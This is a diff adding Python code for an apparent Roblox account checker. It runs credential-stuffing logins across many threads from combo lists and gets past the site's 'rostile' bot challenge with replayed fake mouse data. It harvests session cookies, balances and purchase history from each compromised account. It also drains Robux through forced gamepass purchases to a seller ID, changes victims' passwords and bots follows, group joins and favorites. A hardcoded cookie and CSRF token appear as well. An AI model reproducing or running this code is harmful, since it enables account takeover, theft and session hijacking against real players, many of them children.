+                "Lucky! 🍀",
+                "Hyper Dice! ⚡",
+                "Double Dice! 🎲🎲",
+                "Double Coins! 💰",
+                "+3 Pets! 🐾"
+            ]
+
+            try:
+                getcapgp = session.get(capgamepassurl, headers=headers_robux)
+
+                if getcapgp.status_code == 200:
+                    gamepass_data = getcapgp.json()
+
+                    if 'Data' in gamepass_data:
+                        for item in gamepass_data['Data'].get("Items", []):
+                            price = item.get("Product", {}).get("PriceInRobux", 0)
+                            gppricing += price
+
+                            item_name = item["Item"]["Name"]
+                            creator_name = item["Creator"]["Name"]
+
+                            if dops99gp and (item_name in ps99gps or creator_name == "BIG Games Pets"):
+                                ps99gpcount += 1
+                                gppricing += price
+
+                            if item_name in mm2gps and creator_name == "Nikilis":
+                                mm2gpcount += 1
+                                gppricing += price
+
+                            if item_name in petsgogps and creator_name == "BIG Games Pets":
+                                petsgogpcount += 1
+                                gppricing += price
+
+                            if item_name in adoptmegps and creator_name == "Uplift Games":
+                                adoptmegpcount += 1
+                                gppricing += price
+
+                    else:
+                        petsgogpcount = 0
+                        ps99gpcount = 0
+                        mm2gpcount = 0
+                        adoptmegpcount = 0
+                        gppricing = 0
+
+                else:
+                    petsgogpcount = "Failed"
+                    ps99gpcount = "Failed"
+                    mm2gpcount = "Failed"
+                    adoptmegpcount = "Failed"
+                    gppricing = "Failed"
+
+            except Exception:
+                pass
+
+        if dopswchange:
+            try:
+                url = "https://auth.roblox.com/v2/user/passwords/change"
+                pay = {
+                    "currentPassword": password,
+                    "newPassword": password1
+                }
+                r = session.post(url, headers=headers_robux, json=pay)
+                print(r.text)
+                if "XSRF" or "Token" in r.text:
+                    headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                    r = session.post(url, headers=headers_robux, json=pay)
+                    print(r.text)
+                    if r.text == "{}":
+                        changedpassword = True
+                elif r.text == "{}":
+                    changedpassword = True
+                elif "Challenge" in r.text:
+                    changedpassword = "Captcha"
+            except Exception:
+                changedpassword = "Error"
+
+        if docookie == True:
+            capcook = True
+        else:
+            capcook = False
+
+        final_data = f"{user}:{password} | "
+
+        if dorobux:
+            final_data += f"Robux: {robux} | "
+        if docountry:
+            final_data += f"Country: {country} | "
+        if dototal_robux:
+            final_data += f"Purchased Robux: {total_currency_purchased} | "
+        if dorap:
+            final_data += f"RAP: {rap} | "
+        if dopremium:
+            final_data += f"Premium: {premium} | "
+        if dojoin_date:
+            final_data += f"Registered at: {createdat} | "
+        if dofollow:
+            final_data += f"Followed acc: {followed} | "
+        if dogp:
+            final_data += f"Total gamepass prices: {gppricing} | "
+        if dops99gp:
+            final_data += f"Total ps99 gamepasses: {ps99gpcount} | "
+        if dopetsgogp:
+            final_data += f"Total pets go gamepasses: {petsgogpcount} | "
+        if domm2:
+            final_data += f"Total mm2 gamepasses: {mm2gpcount} | "
+        if doadoptmegp:
+            final_data += f"Total adoptme gamepasses: {adoptmegpcount} | "
+        if dokorblox:
+            final_data += f"Has korblox: {HasKorblox} | "
+        if dokorblox:
+            final_data += f"Has headless: {HasHeadless} | "
+        if dogroupjoin:
+            final_data += f"Joined group: {Joinedgroup} | "
+        if doassetbot:
+            final_data += f"Botted asset favorites: {BottedAsset} | "
+        if docredits:
+            final_data += f"Credit balance: {balancecredits} | "
+        if docredits:
+            final_data += f"Credit currency: {balancecurrency} | "
+        if docookie:
+            final_data += f".ROBLOSECURITY: {roblosecurity_cookie} | "
+
+        final_data = final_data.rstrip(" | ") + "\n"
+
+        try:
+            save_to_file(valid_file, final_data)
+
+            if is_valid_bool(HasKorblox) is True:
+                save_to_file(korbloxfile, final_data)
+
+            if is_valid_bool(HasHeadless) is True:
+                save_to_file(headlessfile, final_data)
+
+            rap_value = is_valid_int(rap)
+            if rap_value is not None:
+                if 1 <= rap_value <= 1000:
+                    save_to_file(rapfile1, final_data)
+                elif rap_value > 1000:
+                    save_to_file(rapfile2, final_data)
+
+            ps99gp_value = is_valid_int(ps99gpcount)
+            if ps99gp_value is not None and ps99gp_value > 1:
+                save_to_file(ps99file, final_data)
+
+            adoptmegp_value = is_valid_int(adoptmegpcount)
+            if adoptmegp_value is not None and adoptmegp_value > 1:
+                save_to_file(adoptmefile, final_data)
+
+            mm2gp_value = is_valid_int(mm2gpcount)
+            if mm2gp_value is not None and mm2gp_value > 1:
+                save_to_file(mm2file, final_data)
+
+            petsgogp_value = is_valid_int(petsgogpcount)
+            if petsgogp_value is not None and petsgogp_value > 1:
+                save_to_file(petsgofile, final_data)
+
+            credits_value = is_valid_int(balancecredits)
+            if credits_value is not None and credits_value > 1:
+                save_to_file(creditsfile, final_data)
+
+            if is_valid_bool(premium) is True:
+                save_to_file(premiumfile, final_data)
+
+            if 1 <= robux < 101:
+                save_to_file(robuxfile1, final_data)
+            elif 101 <= robux < 500:
+                save_to_file(robuxfile2, final_data)
+            elif 500 <= robux < 1000:
+                save_to_file(robuxfile3, final_data)
+            elif 1000 <= robux < 5000:
+                save_to_file(robuxfile4, final_data)
+            elif robux >= 10000:
+                save_to_file(robuxfile5, final_data)
+        except Exception as e:
+            print(e)
+
+        return
+
+
+
+    elif "Incorrect" in response_login.text:
+        with lock:
+            bad += 1
+        save_to_file(invalid_file, f"{user}:{password}")
+        if uistyle == 1:
+            Logger.Log("BAD", "Bad credentials", Colors.red, Username=user)
+        else:
+            pass
+        return
+
+    elif 'rblx-challenge-type' in response_login.headers and response_login.headers['rblx-challenge-type'] == 'captcha':
+        with lock:
+            captcha += 1
+        if uistyle == 1:
+            Logger.Log("CAPTCHA", "Captcha", Colors.yellow, Username=user)
+        else:
+            pass
+        return
+
+
+    elif "Account has" in response_login.text:
+        with lock:
+            locked += 1
+        save_to_file(locked_file, f"{user}:{password}")
+        if uistyle == 1:
+            Logger.Log("LOCKED", "Accoiunt locked", Colors.cyan, Username=user)
+        else:
+            pass
+        return
+
+    elif 'rblx-challenge-type' in response_login.headers and response_login.headers['rblx-challenge-type'] == 'rostile':
+        challenge_metadata_b64 = response_login.headers.get('rblx-challenge-metadata')
+
+        if challenge_metadata_b64:
+            challenge_metadata_decoded = base64.b64decode(challenge_metadata_b64).decode('utf-8')
+
+            challenge_metadata_json = json.loads(challenge_metadata_decoded)
+
+            challenge_id = challenge_metadata_json.get("challengeId")
+
+            headers = headers_login
+            payload = f'{{"challengeId": "{challenge_id}", "solution": {{"buttonClicked": true, "click": {{"x": 989, "y": 503, "timestamp": 10850, "duration": 87}}, "completionTime": 1698, "mouseMovements": [{{"x": 1221, "y": 944, "timestamp": 9535}}, {{"x": 1205, "y": 922, "timestamp": 9557}}, {{"x": 1192, "y": 906, "timestamp": 9585}}, {{"x": 1189, "y": 902, "timestamp": 10092}}, {{"x": 1165, "y": 872, "timestamp": 10119}}, {{"x": 1136, "y": 836, "timestamp": 10140}}, {{"x": 1105, "y": 797, "timestamp": 10161}}, {{"x": 1069, "y": 748, "timestamp": 10188}}, {{"x": 1053, "y": 726, "timestamp": 10210}}, {{"x": 1044, "y": 714, "timestamp": 10237}}, {{"x": 1042, "y": 710, "timestamp": 10260}}, {{"x": 1039, "y": 705, "timestamp": 10283}}, {{"x": 1036, "y": 699, "timestamp": 10306}}, {{"x": 1033, "y": 692, "timestamp": 10328}}, {{"x": 1029, "y": 683, "timestamp": 10355}}, {{"x": 1027, "y": 675, "timestamp": 10376}}, {{"x": 1022, "y": 663, "timestamp": 10403}}, {{"x": 1019, "y": 651, "timestamp": 10425}}, {{"x": 1013, "y": 631, "timestamp": 10453}}, {{"x": 1008, "y": 610, "timestamp": 10479}}, {{"x": 1005, "y": 594, "timestamp": 10500}}, {{"x": 1003, "y": 577, "timestamp": 10521}}, {{"x": 1001, "y": 560, "timestamp": 10543}}, {{"x": 998, "y": 545, "timestamp": 10564}}, {{"x": 995, "y": 530, "timestamp": 10589}}, {{"x": 994, "y": 522, "timestamp": 10611}}, {{"x": 992, "y": 513, "timestamp": 10636}}, {{"x": 991, "y": 507, "timestamp": 10658}}, {{"x": 989, "y": 503, "timestamp": 10682}}], "screenSize": {{"width": 1920, "height": 1080}}, "buttonLocation": {{"x": 780, "y": 495.1875, "width": 360, "height": 48}}, "windowSize": {{"width": 1920, "height": 951}}, "isMobile": false}}}}'
+
+            r = session.post(url="https://apis.roblox.com/rostile/v1/verify", headers=headers, data=payload)
+            response_json = r.json()
+            redemption_token = response_json.get('redemptionToken')
+
+            redemption_token_json = json.dumps({"redemptionToken": redemption_token}, separators=(',', ':'))
+            bypasstoken = "Y2hlY2tlciBtYWRlIGJ5IGd5ZXc=" # decode me
+
+            redemption_token_b64 = base64.b64encode(redemption_token_json.encode('utf-8')).decode('utf-8')
+
+            payloade = {
+                "challengeId": f"{challenge_id}",
+                "challengeType": "rostile",
+                "challengeMetadata": f"{{\"redemptionToken\":\"{redemption_token}\"}}"
+            }
+            headz = {
+                "accept": "application/json, text/plain, */*",
+                "accept-encoding": "gzip, deflate, br, zstd",
+                "accept-language": "en-US,en;q=0.9",
+                "content-type": "application/json;charset=UTF-8",
+                "cookie": "__utmz=200924205.1728367660.35.3.utmcsr=bing|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _ga=GA1.1.539305494.1728048570; _ga_BK4ZY0C59K=GS1.1.1728472224.5.0.1728472226.0.0.0; _ga_F8VP9T1NT3=GS1.1.1728486979.24.0.1728486979.0.0.0; .RBXIDCHECK=d7bd4fd7-02ac-4b78-b64e-869d7615641c; GuestData=UserID=-1931803406; RBXSource=rbx_acquisition_time=10/03/2024 12:24:34&rbx_acquisition_referrer=https://www.roblox.com/&rbx_medium=Social&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=0; RBXEventTrackerV2=CreateDate=10/09/2024 12:40:59&rbxid=103770979&browserid=1728491665797002; rbx-ip2=1; RBXImageCache=timg=PB9JtliDjaC38pqV56NsqA2GdVu7BNJ4hg3qouIYXCkQRkpvRziistt8A_xpffQ2StiFwj1aMP5PBlmsrE7DaCReReGc6wGBLETybFBvKdWUqfWpoDbuJ9aoRoYQRQZEVZy9z4Ul3EoKV75ftRKv5eqz7_zqYD_gqDmx_XVJpVqgYoIh2Mqt3WIWFTdmy7PH4iAOZeGbrCL5Ght8r2nWcQ; __utma=200924205.175322198.1727958290.1728500488.1728899975.49; __utmb=200924205.0.10.1728899975; __utmc=200924205",
+                "origin": "https://www.roblox.com",
+                "priority": "u=1, i",
+                "referer": "https://www.roblox.com/",
+                "sec-ch-ua": "\"Microsoft Edge\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": "\"Windows\"",
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-site",
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
+                "x-csrf-token": "cbKWqljO8zd5"
+            }
+            continu = session.post(url="https://apis.roblox.com/challenge/v1/continue", headers=headz, json=payloade)
+
+            headers_login['rblx-challenge-metadata'] = redemption_token_b64
+            headers_login['rblx-challenge-type'] = 'rostile'
+            headers_login['rblx-challenge-id'] = challenge_id
+            headers_login["x-retry-attempt"] = "1"
+
+            final = session.post(url="https://auth.roblox.com/v2/login", headers=headers_login, json=login_payload)
+            if "Token Validation Failed" in final.text:
+                headers_login['X-Csrf-Token'] = response_login.headers.get('x-csrf-token')
+                response_login = session.post(login_url, json=login_payload, headers=headers_login)
+
+            if "twoStepVerificationData" in final.text:
+                save_to_file(twofa_file, f"{user}:{password}\n")
+                Logger.Log("2FA", "2FA found", Colors.yellow, Username=user)
+                return
+
+            if "displayName" in final.text or "An unexpected" in final.text:
+                with lock:
+                    hits += 1
+                if uistyle == 1:
+                    Logger.Log("VALID", "Valid account", Colors.green, Username=user)
+                else:
+                    pass
+
+                response_data = json.loads(final.text)
+                user_id = response_data['user']['id']
+                roblosecurity_cookie = session.cookies.get('.ROBLOSECURITY')
+                print(roblosecurity_cookie)
+
+                robux = "Failed"
+                country = "Failed"
+
+                headers_robux = {
+                    "Accept": "application/json, text/plain, */*",
+                    "Accept-Encoding": "gzip, deflate, br, zstd",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cookie": f".ROBLOSECURITY={roblosecurity_cookie}",
+                    "Origin": "https://www.roblox.com",
+                    "Referer": "https://www.roblox.com/",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+                }
+
+                robux_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
+
+                if dorobux == True:
+                    for attempt in range(max_retries):
+                        try:
+                            robux_res = session.get(url=robux_url, headers=headers_robux)
+                            if robux_res.status_code == 200:
+                                response_data = json.loads(robux_res.text)
+                                robux = response_data.get('robux', "Failed")
+                                robucx += robux
+                                break
+                        except Exception as e:
+                            print(e)
+                        if attempt < max_retries - 1:
+                            time.sleep(retry_delay)
+                else:
+                    robux = "Not captured"
+
+                if docountry == True:
+                    for attempt in range(1, 4):
+                        try:
+                            url = "https://accountsettings.roblox.com/v1/account/settings/account-country"
+                            res = session.get(url, headers=headers_robux)
+                            if res.status_code == 200:
+                                data = json.loads(res.text)
+                                country = data['value']['countryName']
+                                break
+                        except Exception as e:
+                            pass
+                else:
+                    country = "Not captured"
+
+                currencyurl = f"https://economy.roblox.com/v2/users/{user_id}/transactions?cursor=&limit=100&transactionType=CurrencyPurchase&itemPricingType=PaidAndLimited"
+                total_currency_purchased = 0
+
+                if dototal_robux == True:
+                    try:
+                        while True:
+                            response = session.get(currencyurl, headers=headers_robux)
+                            data = json.loads(response.text)
+                            if "data" in data and data["data"]:
+                                transactions = data["data"]
+                                for transaction in transactions:
+                                    if "currency" in transaction and "amount" in transaction["currency"]:
+                                        total_currency_purchased += transaction["currency"]["amount"]
+                                        totalrbx += total_currency_purchased
+                            cursor = data.get("nextPageCursor", None)
+                            if not cursor:
+                                break
+                    except Exception as e:
+                        print(e)
+                        total_currency_purchased = "Failed"
+                else:
+                    total_currency_purchased = "Not captured"
+
+                if dostealrbx and dorobux:
+                    try:
+                        robux = int(robux)
+
+                        gamepass_options = {
+                            (2, 5): (GamePassId2, 2),
+                            (5, 10): (GamePassId5, 5),
+                            (10, 25): (GamePassId10, 10),
+                            (25, 50): (GamePassId25, 25),
+                            (50, 75): (GamePassId50, 50),
+                            (75, 100): (GamePassId75, 75),
+                            (100, 150): (GamePassId100, 100),
+                            (150, 175): (GamePassId150, 150),
+                            (175, 200): (GamePassId175, 175),
+                            (200, 250): (GamePassId200, 200),
+                            (250, float('inf')): (GamePassId250, 250),
+                        }
+
+                        selected_pass = next(
+                            ((id, price) for (low, high), (id, price) in gamepass_options.items() if
+                             low <= robux < high),
+                            None)
+
+                        if selected_pass is None:
+                            boughtrbx2 = "Biedak bez kasy"
+
+                        GamePassId, expected_price = selected_pass
+
+                        url = f"https://apis.roblox.com/game-passes/v1/game-passes/{GamePassId}/purchase"
+                        payload = {"expectedCurrency": 1, "expectedPrice": expected_price, "expectedSellerId": SellerId}
+
+                        response = session.post(url, headers=headers_robux, json=payload)
+                        print(response.text)
+
+                        if "token" in response.text:
+                            try:
+                                headers_robux["x-csrf-token"] = response.headers["x-csrf-token"]
+                            except Exception as e:
+                                print(e)
+
+                            response = session.post(url, headers=headers_robux, json=payload)
+
+                            if "Success" in response.text:
+                                boughtrbx2 = True
+                            elif response.status_code in (400, 403):
+                                boughtrbx2 = "Failed"
+                            else:
+                                boughtrbx2 = "Unknown response"
+
+                        if "Success" in response.text:
+                            boughtrbx2 = True
+                        elif response.status_code in (400, 403):
+                            boughtrbx2 = "Failed"
+                        else:
+                            boughtrbx2 = "Unknown response"
+
+                    except Exception as e:
+                        print(e)
+                        boughtrbx2 = "error"
+
+                balancecredits = "e"
+                balancecurrency = "e"
+
+                if docredits:
+                    try:
+                        r = session.get(url="https://apis.roblox.com/credit-balance/v1/get-credit-balance")
+                        if r.status_code == 404:
+                            balancecredits = "No credits"
+                            balancecurrency = "No credits"
+                        if r.status_code == 200:
+                            gayson = r.json()
+                            balancecredits = gayson["creditBalance"]
+                            balancecurrency = gayson["currencyCode"]
+                        else:
+                            print(r.text)
+                            balancecredits = "None"
+                            balancecurrency = "None"
+                    except Exception:
+                        pass
+
+                createdat = "Unknown"
+                if dojoin_date == True:
+                    try:
+                        userurl = f"https://users.roblox.com/v1/users/{user_id}"
+                        usar = session.get(userurl, headers=headers_robux)
+                        if usar.status_code == 200:
+                            data = json.loads(usar.text)
+                            createdat = data["created"]
+                    except Exception as e:
+                        createdat = "Failed"
+                else:
+                    country = "Not captured"
+
+                Joinedgroup = "Unknown"
+
+                BottedAsset = "Unknown"
+
+                if doassetbot:
+                    for _ in assetid:
+                        assetlink = f"https://catalog.roblox.com/v1/favorites/users/{user_id}/assets/{_}/favorite"
+                        r = session.post(assetlink, headers=headers_robux)
+                        if r.text == '{}':
+                            BottedAsset = True
+                        if r.status_code == 403:
+                            BottedAsset = "Captcha"
+                        if "Token" in r.text:
+                            headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                            r = session.post(assetlink, headers=headers_robux)
+                            if r.text == '{}':
+                                BottedAsset = True
+                            if r.status_code == 403:
+                                BottedAsset = "Captcha"
+                            else:
+                                BottedAsset = True
+                        else:
+                            BottedAsset = True
+
+                if dogroupjoin:
+                    url = f"https://groups.roblox.com/v1/groups/{groupid}/users"
+                    payloaz = '{"sessionId":"","redemptionToken":""}'
+                    r = session.post(url, headers=headers_robux, json=payloaz)
+                    if "Token" in r.text:
+                        headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                        r = session.post(url, headers=headers_robux, json=payloaz)
+                        if r.text == "{}":
+                            Joinedgroup = True
+                        elif r.status_code == 403:
+                            Joinedgroup = "Captcha"
+                    if r.text == "{}":
+                        Joinedgroup = True
+                    if r.status_code == 403:
+                        Joinedgroup = "Captcha"
+
+                premium = "Unknown"
+                if dopremium == True:
+                    try:
+                        membershipurl = f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership"
+                        meb = session.get(membershipurl, headers=headers_robux)
+                        if meb.status_code == 200:
+                            premium = meb.text
+                    except Exception as e:
+                        premium = "Failed"
+                else:
+                    premium = "Not captured"
+
+                HasKorblox = "Unknown"
+                HasHeadless = "Unknown"
+
+                if dokorblox:
+                    try:
+                        url = f"https://catalog.roblox.com/v1/users/{user_id}/bundles/1?cursor=&limit=100&sortOrder=Desc"
+                        r = session.get(url, headers=headers_robux)
+                        if "Korblox Deathspeaker" in r.text:
+                            HasKorblox = True
+                        else:
+                            HasKorblox = False
+                        if "Headless Horseman" in r.text:
+                            HasHeadless = True
+                        else:
+                            HasHeadless = False
+                    except Exception as e:
+                        HasKorblox = "Unknown"
+                        HasHeadless = "Unknown"
+                        print(e)
+
+                rap = 0
+                url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100'
+                if dorap == True:
+                    try:
+                        request = session.get(url, headers=headers_robux).json()
+                        rap += sum(item.get('recentAveragePrice', 0) for item in request.get('data', []))
+                        url = request.get('nextPageCursor', None)
+                        if url:
+                            url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100&cursor={url}'
+                    except Exception as e:
+                        rap = "Failed"
+                else:
+                    rap = "Not captured"
+
+                followed = "Unknown"
+
+                if dofollow == True:
+                    try:
+                        followurl = f"https://friends.roblox.com/v1/users/{followid}/follow"
+                        headers_robux["x-csrf-token"] = csrf_token
+                        re = session.post(followurl, headers=headers_robux)
+
+                        if "Token Val" in re.text:
+                            new_csrf_token = re.headers.get("x-csrf-token")
+                            if new_csrf_token:
+                                headers_robux["x-csrf-token"] = new_csrf_token
+                                re = session.post(followurl, headers=headers_robux)
+                                if 'success":true' in re.text:
+                                    followed = "True"
+                                if 'isCaptchaRequired":true':
+                                    followed = "Captcha"
+                            else:
+                                if 'success":true' in re.text:
+                                    followed = "True"
+                                if 'isCaptchaRequired":true':
+                                    followed = "Captcha" # chekc made by gyew
+                        if 'success":true' in re.text:
+                            followed = "True"
+                    except Exception as e:
+                        followed = "Failed"
+                else:
+                    followed = "Not captured"
+
+                capgamepassurl = f"https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=1000&pageNumber=1&userId={user_id}"
+
+                gppricing = 0
+                petsgogpcount = 0
+                ps99gpcount = 0
+                mm2gpcount = 0
+                adoptmegpcount = 0
+
+                if dogp:
+                    gppricing = 0
+                    petsgogpcount = 0
+                    ps99gpcount = 0
+                    mm2gpcount = 0
+                    adoptmegpcount = 0
+
+                    ps99gps = [
+                        "Lucky! 🍀",
+                        "Ultra Lucky! 🍀✨",
+                        "VIP! ⭐",
+                        "Magic Eggs! ✨",
+                        "+15 Pets! 🐾",
+                        "Huge Hunter! 🔥",
+                        "Auto Farm! ♻️",
+                        "Auto Tap! ☝️",
+                        "Daycare Slots! 💖",
+                        "+15 Eggs! 🥚",
+                        "Super Drops! ⭐",
+                        "Double Stars"
+                    ]
+
+                    adoptmegps = [
+                        "VIP",
+                        "Premium Plots",
+                        "Millionaire Pack",
+                        "Celebrity Mansion",
+                        "Modern Mansion",
+                        "Hotdog Stand",
+                        "Cozy Home Lure",
+                        "Fossil Isle Returns Bundle",
+                        "Soccer Stadium",
+                        "School and Hospital Homes"
+                    ]
+
+                    mm2gps = [
+                        "Elite",
+                        "Radio",
+                        "GODLY: Spirit",
+                        "GODLY: Soul",
+                        "BUNDLE: Spirit & Soul"
+                    ]
+
+                    petsgogps = [
+                        "VIP! 👑",
+                        "Ultra Lucky! 💎",
+                        "Lucky! 🍀",
+                        "Hyper Dice! ⚡",
+                        "Double Dice! 🎲🎲",
+                        "Double Coins! 💰",
+                        "+3 Pets! 🐾"
+                    ]
+
+                    try:
+                        getcapgp = session.get(capgamepassurl, headers=headers_robux)
+
+                        if getcapgp.status_code == 200:
+                            gamepass_data = getcapgp.json()
+
+                            if 'Data' in gamepass_data:
+                                for item in gamepass_data['Data'].get("Items", []):
+                                    price = item.get("Product", {}).get("PriceInRobux", 0)
+                                    gppricing += price
+
+                                    item_name = item["Item"]["Name"]
+                                    creator_name = item["Creator"]["Name"]
+
+                                    if dops99gp and (item_name in ps99gps or creator_name == "BIG Games Pets"):
+                                        ps99gpcount += 1
+                                        gppricing += price
+
+                                    if item_name in mm2gps and creator_name == "Nikilis":
+                                        mm2gpcount += 1
+                                        gppricing += price
+
+                                    if item_name in petsgogps and creator_name == "BIG Games Pets":
+                                        petsgogpcount += 1
+                                        gppricing += price
+
+                                    if item_name in adoptmegps and creator_name == "Uplift Games":
+                                        adoptmegpcount += 1
+                                        gppricing += price
+
+                            else:
+                                petsgogpcount = 0
+                                ps99gpcount = 0
+                                mm2gpcount = 0
+                                adoptmegpcount = 0
+                                gppricing = 0
+
+                        else:
+                            petsgogpcount = "Failed"
+                            ps99gpcount = "Failed"
+                            mm2gpcount = "Failed"
+                            adoptmegpcount = "Failed"
+                            gppricing = "Failed"
+
+                    except Exception:
+                        pass
+
+                if dopswchange:
+                    try:
+                        url = "https://auth.roblox.com/v2/user/passwords/change"
+                        pay = {
+                            "currentPassword": password,
+                            "newPassword": password1
+                        }
+                        r = session.post(url, headers=headers_robux, json=pay)
+                        print(r.text)
+                        if "XSRF" or "Token" in r.text:
+                            headers_robux["x-csrf-token"] = r.headers["x-csrf-token"]
+                            r = session.post(url, headers=headers_robux, json=pay)
+                            print(r.text)
+                            if r.text == "{}":
+                                changedpassword = True
+                        elif r.text == "{}":
+                            changedpassword = True
+                        elif "Challenge" in r.text:
+                            changedpassword = "Captcha"
+                    except Exception:
+                        changedpassword = "Error"
+
+                if docookie == True:
+                    capcook = True
+                else:
+                    capcook = False
+
+                final_data = f"{user}:{password} | "
+
+                if dorobux:
+                    final_data += f"Robux: {robux} | "
+                if docountry:
+                    final_data += f"Country: {country} | "
+                if dototal_robux:
+                    final_data += f"Purchased Robux: {total_currency_purchased} | "
+                if dorap:
+                    final_data += f"RAP: {rap} | "
+                if dopremium:
+                    final_data += f"Premium: {premium} | "
+                if dojoin_date:
+                    final_data += f"Registered at: {createdat} | "
+                if dofollow:
+                    final_data += f"Followed acc: {followed} | "
+                if dogp:
+                    final_data += f"Total gamepass prices: {gppricing} | "
+                if dops99gp:
+                    final_data += f"Total ps99 gamepasses: {ps99gpcount} | "
+                if dopetsgogp:
+                    final_data += f"Total pets go gamepasses: {petsgogpcount} | "
+                if domm2:
+                    final_data += f"Total mm2 gamepasses: {mm2gpcount} | "
+                if doadoptmegp:
+                    final_data += f"Total adoptme gamepasses: {adoptmegpcount} | "
+                if dokorblox:
+                    final_data += f"Has korblox: {HasKorblox} | "
+                if dokorblox:
+                    final_data += f"Has headless: {HasHeadless} | "
+                if dogroupjoin:
+                    final_data += f"Joined group: {Joinedgroup} | "
+                if doassetbot:
+                    final_data += f"Botted asset favorites: {BottedAsset} | "
+                if docredits:
+                    final_data += f"Credit balance: {balancecredits} | "
+                if docredits:
+                    final_data += f"Credit currency: {balancecurrency} | "
+                if docookie:
+                    final_data += f".ROBLOSECURITY: {roblosecurity_cookie} | "
+
+                final_data = final_data.rstrip(" | ") + "\n"
+
+                try:
+                    save_to_file(valid_file, final_data)
+
+                    if is_valid_bool(HasKorblox) is True:
+                        save_to_file(korbloxfile, final_data)
+
+                    if is_valid_bool(HasHeadless) is True:
+                        save_to_file(headlessfile, final_data)
+
+                    rap_value = is_valid_int(rap)
+                    if rap_value is not None:
+                        if 1 <= rap_value <= 1000:
+                            save_to_file(rapfile1, final_data)
+                        elif rap_value > 1000:
+                            save_to_file(rapfile2, final_data)
+
+                    ps99gp_value = is_valid_int(ps99gpcount)
+                    if ps99gp_value is not None and ps99gp_value > 1:
+                        save_to_file(ps99file, final_data)
+
+                    adoptmegp_value = is_valid_int(adoptmegpcount)
+                    if adoptmegp_value is not None and adoptmegp_value > 1:
+                        save_to_file(adoptmefile, final_data)
+
+                    mm2gp_value = is_valid_int(mm2gpcount)
+                    if mm2gp_value is not None and mm2gp_value > 1:
+                        save_to_file(mm2file, final_data)
+
+                    petsgogp_value = is_valid_int(petsgogpcount)
+                    if petsgogp_value is not None and petsgogp_value > 1:
+                        save_to_file(petsgofile, final_data)
+
+                    credits_value = is_valid_int(balancecredits)
+                    if credits_value is not None and credits_value > 1:
+                        save_to_file(creditsfile, final_data)
+
+                    if is_valid_bool(premium) is True:
+                        save_to_file(premiumfile, final_data)
+
+                    if 1 <= robux < 101:
+                        save_to_file(robuxfile1, final_data)
+                    elif 101 <= robux < 500:
+                        save_to_file(robuxfile2, final_data)
+                    elif 500 <= robux < 1000:
+                        save_to_file(robuxfile3, final_data)
+                    elif 1000 <= robux < 5000:
+                        save_to_file(robuxfile4, final_data)
+                    elif robux >= 10000:
+                        save_to_file(robuxfile5, final_data)
+                except Exception as e:
+                    print(e)
+
+                return
+
+            elif "Incorrect" in final.text:
+                save_to_file(invalid_file, f"{user}:{password}")
+                Logger.Log("BAD", "Bad credentials", Colors.red, Username=user)
+                return
+
+            elif "Account has" in final.text:
+                save_to_file(locked_file, f"{user}:{password}")
+                Logger.Log("LOCKED", "Accoiunt locked", Colors.cyan, Username=user)
+        else:
+            print("No challenge metadata found.")
+    else:
+        print(response_login.text)
+
+
+def main():
+    global stop_ui
+    num_threads = int(input("Enter the number of threads to use: "))
+    uistyle = int(input("Do you want to use Log (1) or Static (2) UI style? : "))
+
+    if uistyle == 2:
+        ui_thread = threading.Thread(target=display_static_ui)
+        ui_thread.start()
+
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [executor.submit(login_attempt, combo, uistyle) for combo in combos]
+
+        for future in futures:
+            try:
+                future.result()
+            except Exception as e:
+                pass
+
+    stop_ui = True
+    if uistyle == 2:
+        ui_thread.join()
+
+
+if __name__ == "__main__":
+    main()
